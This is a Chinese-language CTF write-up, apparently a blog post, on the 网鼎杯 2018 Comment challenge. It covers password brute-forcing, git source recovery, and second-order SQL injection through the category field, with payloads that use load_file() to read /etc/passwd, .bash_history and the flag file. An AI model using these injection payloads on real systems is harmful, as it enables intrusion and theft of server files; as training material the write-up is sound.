---
title: '[网鼎杯 2018]Comment'
date: 2024-06-16 16:04:18
tags: sql注入
categories: 刷题笔记
---

### [网鼎杯 2018]Comment(git源码修复&二次注入)

打开页面，发帖发现需要登录，账号给了，密码还有三位数没给

![image-20240616160714183](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406161607231.png)

我们进行爆破

<!--more-->

![image-20240616161010126](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406161610190.png)

爆出来了，最后三位666，我们进行登录

然后扫描目录，发现git源码泄露

我们利用githacker得到源码

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/fc401dd1e0ea45eea4b32d70aa753bad.png)

但这个文件不全，我们找一下历史漏洞

```
git log --reflog

得到：commit e5b2a2443c2b6d395d06960123142bc91123148c (refs/stash) 有很多的这种的，从第一个一个试
然后恢复到想要的版本

git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c

hard 后面跟随的是之前版本的文件记录，也叫版本回滚

```

我们就能得到完整源码了（wp找的，我没找到）

```
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    $category = addslashes($_POST['category']);
    $title = addslashes($_POST['title']);
    $content = addslashes($_POST['content']);
    $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;
case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
    $category = mysql_fetch_array($result)['category'];
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
    $result = mysql_query($sql);
    }
    header("Location: ./comment.php?id=$bo_id");
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>

```

然后就是代码审计了

我们可以发现当do=write的时候，传入的信息都会进行转义，但是数据库会自动清除反斜杠，

![image-20240616170312823](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406161703856.png)

do=comment的时候，可以发现直接从category这个字段进行查询，这就导致了二次注入
所以说那个转义函数根本起不到防护的作用

![image-20240616170333625](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406161703668.png)

通过下面的sql语句来进行注入

```
 $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
```

首先我们需要在界面看到sql注入后的回显

可以发现content这个变量最后会回显在我们的留言页面中，那么就通过他来输出我们的sql语句
然后闭合sql语句 由于内容太多了，采取/**/的批量注释方法,

payload

```
title=23&category=1',content=database(),/*&content=3123

```

再让content = */#

![image-20240616170959263](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406161709356.png)

提交之后会爆出库名

我们查看users

```
title=23&category=1',content=user(),/*&content=3123
```

发现使用者是root权限

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503101150975.png)

这样的话，一般 flag 就不会在数据库里面(因为如果在数据库中，不需要root权限)

所以sql注入读取本地文件 可以使用load_file()

玩过linux的都知道 /etc/passwd这里存储用户信息
payload

```
category==213',content=(select load_file('/etc/passwd')),/*

```

![image-20240616171347651](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406161713771.png)

有个www用户

查看**bash_history ：** **保存了当前用户使用过的历史命令,方便查找**

在/home/www/下

```
213',content=(select load_file('/home/www/.bash_history')),/*

```

![image-20240616171457354](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406161714413.png)

看见他删除了 .DS_Store 文件，由于目标环境是docker，所以 .DS_Store 文件应该在 /tmp/html 中。而 .DS_Store 文件中，经常会有一些不可见的字符，可以使用hex函数对其进行16进制转换，

```
213 ',content=(select hex(load_file("/tmp/html/.DS_Store"))),/*

```

出来一大窜16进制，我们放bp解码，flag在`flag_8946e1f1ee3e40f.php`

![image-20240616193121026](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406161931138.png)

payload访问文件

```
213',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*
```

![image-20240616192502204](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406161925278.png)

我们进行解码

![image-20240616193256248](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406161932303.png)

得到flag
